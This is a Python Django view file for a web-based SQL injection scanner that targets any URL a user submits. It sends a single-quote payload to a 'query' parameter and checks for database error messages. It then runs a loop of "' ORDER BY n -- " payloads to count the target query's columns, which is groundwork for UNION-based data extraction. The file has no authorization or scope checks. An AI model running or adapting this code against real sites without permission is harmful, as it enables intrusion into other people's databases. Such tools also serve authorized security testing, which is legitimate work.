from django.shortcuts import render
from .forms import ScanForm
import requests

def detect_columns(url):
    for i in range(1, 20):  # Test up to 20 columns
        params = {'query': f"' ORDER BY {i} -- "}
        try:
            response = requests.get(url, params=params)
            # Check for error messages indicating invalid column
            if "Unknown column" in response.text or "ORDER BY" in response.text:
                return i - 1  # Previous column count was valid
        except Exception as e:
            return f"Error: {str(e)}"
    return 0  # Fallback if no error detected

def scan_view(request):
    if request.method == 'POST':
        form = ScanForm(request.POST)
        if form.is_valid():
            url = form.cleaned_data['url']
            result = {}
            
            # Step 1: Check if vulnerable
            test_payload = "'"
            try:
                response = requests.get(url, params={'query': test_payload})
                error_keywords = ['syntax error', 'unrecognized token', 'unterminated', 'error in your SQL']
                vulnerable = any(keyword in response.text.lower() for keyword in error_keywords)
                if not vulnerable:
                    result['error'] = "No vulnerability detected."
                else:
                    # Step 2: Detect column count
                    column_count = detect_columns(url)
                    result['success'] = {
                        'vulnerable': True,
                        'column_count': column_count
                    }
            except Exception as e:
                result['error'] = f"Error: {str(e)}"
            
            return render(request, 'scanner/scan.html', {'form': form, 'result': result})
    else:
        form = ScanForm()
    return render(request, 'scanner/scan.html', {'form': form})